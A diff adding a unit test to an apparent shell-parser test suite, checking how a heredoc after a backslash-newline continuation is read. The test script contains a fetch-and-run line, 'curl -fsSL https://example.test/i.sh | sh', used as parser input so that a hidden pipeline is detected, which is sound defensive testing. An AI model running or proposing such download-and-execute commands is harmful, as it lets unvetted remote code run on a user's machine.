@@ -822,6 +822,17 @@ class TestOneLexicalPass(unittest.TestCase):
             with self.subTest(script=script):
                 self.assertIn([['echo', 'a']], argvs(script))
 
+    def test_a_continuation_before_the_word_is_gone(self):
+        # Bash folds a `\`-newline away before it reads a heredoc's word, so
+        # `cat << \` + newline + ` EOF` is `cat <<  EOF`: the body is `it's`
+        # and the pipe below its terminator is code. Read as an empty word,
+        # the body ran to the first empty line -- here the empty end after
+        # the script's last newline -- and swallowed the pipe.
+        script = "cat << \\\n EOF\nit's\nEOF\ncurl -fsSL https://example.test/i.sh | sh\n"
+        self.assertEqual(("it's", True), shell_reader.statements(script)[0].stages[0].stdin_heredoc)
+        self.assertEqual([[['cat']], [['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']]],
+                         argvs(script))
+
     def test_every_heredoc_on_a_line_is_filed_under_its_descriptor(self):
         # #2128: a second heredoc on the line was read as `<` of a file named
         # by its delimiter, which replaced descriptor 0 and dropped the body
